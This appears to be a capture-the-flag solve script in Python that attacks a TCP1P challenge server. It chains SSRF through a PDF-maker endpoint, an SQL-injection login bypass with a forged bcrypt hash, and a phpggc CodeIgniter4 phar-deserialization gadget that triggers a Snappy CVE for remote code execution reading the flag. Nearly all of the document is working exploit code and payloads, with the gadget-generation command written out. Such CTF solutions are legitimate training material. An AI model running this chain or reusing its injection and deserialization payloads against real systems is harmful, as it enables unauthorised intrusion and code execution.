# SSRF to upload a .phar file via the /ftp endpoint,
# SSRF + SQLI to login as admin,
# SSRF to trigger a snappy CVE to get remote code execution
# thanks to:
# https://github.com/advisories/GHSA-92rv-4j2h-8mjj
# https://github.com/ambionics/phpggc/
# https://stackoverflow.com/questions/50756182/sql-injection-with-password-verify
# https://www.youtube.com/watch?v=2vAr9K5chII&t=558s
#
# run this command to generate poc.phar:
# phpggc CodeIgniter4/RCE2 exec "cat /flag* > /tmp/fff" -p phar -o poc.phar
import base64
import requests
import os

url = "http://ctf.tcp1p.com:29458"
FILENAME = "/tmp/" + os.urandom(8).hex() + ".phar"

session = requests.Session()

session.post(
	url + "/login",
	data={
	"username":
		"admin",
	'""union/**/select/**/1,"admin","$2y$10$nesEyiJKMb8sZifSwP7gzeMUmucBxjD7cKO/mmWyuK1iuwOLGvAFe","","admin"#':
		"asdf",
	"password":
		""
	}
)

resp = session.post(
	"http://ctf.tcp1p.com:29458/pdf-maker",
	data={
	"body": open("upload.html", encoding="utf-8").read().replace("FILENAME", FILENAME),
	"option": "getOutputFromHtml"
	}
)
print(resp.text)
pdf = base64.b64decode(resp.json()["pdf"])
open("out1.pdf", "wb").write(pdf)

resp = session.post(
	url + "/pdf-maker",
	data={
	"body": open("solve.html", encoding="utf-8").read().replace("FILENAME", FILENAME),
	"option": "getOutputFromHtml"
	}
)

#print(resp.text)
#pdf = base64.b64decode(resp.json()["pdf"])
#open("out2.pdf", "wb").write(pdf)

resp = session.post(
	"http://ctf.tcp1p.com:29458/pdf-maker",
	data={
	"body": open("read_output.html", encoding="utf-8").read(),
	"option": "getOutputFromHtml"
	}
)

#print(resp.text)
pdf = base64.b64decode(resp.json()["pdf"])
open("out3.pdf", "wb").write(pdf)
